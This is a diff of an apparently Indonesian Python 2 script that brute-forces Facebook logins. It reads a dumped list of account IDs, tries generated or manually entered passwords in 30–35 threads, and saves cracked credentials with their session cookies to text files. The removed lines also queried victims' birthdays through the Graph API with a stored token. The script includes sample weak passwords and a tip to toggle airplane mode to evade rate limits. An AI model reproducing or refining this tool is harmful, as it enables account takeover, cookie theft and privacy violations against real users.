-					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
-					self.ada.append("%s | %s"%(fl.get("id"),i))
-					if fl.get("id") in open("Live.txt").read():
-						break
-					else:
-						open("Live.txt","a+").write(
-						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					print("\r\x1b[1;92mÂ«OkÂ» "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					self.ok.append("%s | %s"%(fl.get("id"),i))
+					open("Ok.txt","a+").write("%s|%s %s\n"%(fl.get("id"), i, gets_cookies(log.get("cookies"))))
 					break
 				elif log.get("status")=="cp":
-					try:
-						token=open('___rozhak___','r').read()
-						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
-						w=json.loads(q.text)
-						bt=w["birthday"]
-
-					except (KeyError, IOError):
-		                         bt = "         "
-					except:pass
-					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
-					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
-					open("Check.txt","a+").write(
-						"%s|%s %s\n"%(fl.get("id"),i,bt))
+					print("\r\x1b[1;93mÂ«CpÂ» "+(fl.get("id")+"|"+i+"        "))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
+					open("Cp.txt","a+").write("%s|%s\n"%(fl.get("id"),i))
 					break
 				else:continue
 
-			self.ko+=1
-			print "\r\x1b[1;97m[*] Crack %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			self.die+=1
+			print "\r\x1b[1;97mÂ«CrackÂ» %s/%s Ok:%s - Cp:%s"%(self.die,len(self.fl),len(self.ok),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
-class crack3:
+class __crack3__:
 	def __init__(self):
-		self.ada=[]
+		self.ok=[]
 		self.cp=[]
-		self.ko=0
-		while True:
-			f=raw_input("\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Gunakan Password Manual (y/t) :\x1b[1;92m ")
-			if f=="":continue
-			elif f=="y":
-				try:
-					while True:
-						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
-							self.fs=open(self.apk).read().splitlines()
-							break
-						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-							continue
-					self.fl=[]
-					for i in self.fs:
-						try:
-							self.fl.append({"id":i.split("<=>")[0]})
-						except:continue
-				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
-					continue
-				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
-				self.pwlist()
-				break
-			elif f=="t":
-				try:
-					while True:
-						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
-							self.fs=open(self.apk).read().splitlines()
-							break
-						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-							continue
-					self.fl=[]
-					for i in self.fs:
-						try:
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-						except:continue
-				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
-					continue
-				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-				ThreadPool(35).map(self.main,self.fl)
-				os.remove(self.apk)
-				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
-				break
-	def pwlist(self):
-		self.pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
-		if len(self.pw) ==0:
-			self.pwlist()
-		else:
-			for i in self.fl:
-				i.update({"pw":self.pw})
-			print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-			ThreadPool(30).map(self.main,self.fl)
-			os.remove(self.apk)
-			exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
+		self.die=0
+		try:
+			self.file=raw_input("%sÂ«%s?%s File dump :%s "%(H,B,P,K))
+                        self.files=open(self.file).read().splitlines()
+                except Exception as e:
+			exit("%sÂ«%s!%s File tidak ditemukan"%(K,M,K))
+                self.fl=[]
+                for i in self.files:
+	                try:
+				self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+	                except Exception as e:
+				exit("%sÂ«%s!%s File tidak valid"%(K,M,K))
+		print("%sÂ«%s!%s Mainkan mode pesawat jika tidak ada hasil\n"%(H,M,P))
+                ThreadPool(35).map(self.main,self.fl)
+               	exit("\n%sÂ«%sSelesai%sÂ»"%(H,P,H))
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=mobile(fl.get("id"),
 					i,"https://m.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
-					self.ada.append("%s | %s"%(fl.get("id"),i))
-					if fl.get("id") in open("Live.txt").read():
-						break
-					else:
-						open("Live.txt","a+").write(
-						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					print("\r\x1b[1;92mÂ«OkÂ» "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					self.ok.append("%s | %s"%(fl.get("id"),i))
+					open("Ok.txt","a+").write("%s|%s %s\n"%(fl.get("id"), i, gets_cookies(log.get("cookies"))))
 					break
 				elif log.get("status")=="cp":
-					try:
-						token=open('___rozhak___','r').read()
-						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
-						w=json.loads(q.text)
-						bt=w["birthday"]
-
-					except (KeyError, IOError):
-		                         bt = "         "
-					except:pass
-					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
-					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
-					open("Check.txt","a+").write(
-						"%s|%s %s\n"%(fl.get("id"),i,bt))
+					print("\r\x1b[1;93mÂ«CpÂ» "+(fl.get("id")+"|"+i+"        "))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
+					open("Cp.txt","a+").write("%s|%s\n"%(fl.get("id"),i))
 					break
 				else:continue
 
-			self.ko+=1
-			print "\r\x1b[1;97m[*] Crack %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			self.die+=1
+			print "\r\x1b[1;97mÂ«CrackÂ» %s/%s Ok:%s - Cp:%s"%(self.die,len(self.fl),len(self.ok),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 
 if __name__=='__main__':
-	os.system('git pull')
-	menu()
+	os.system("git pull")
+	__menu__()
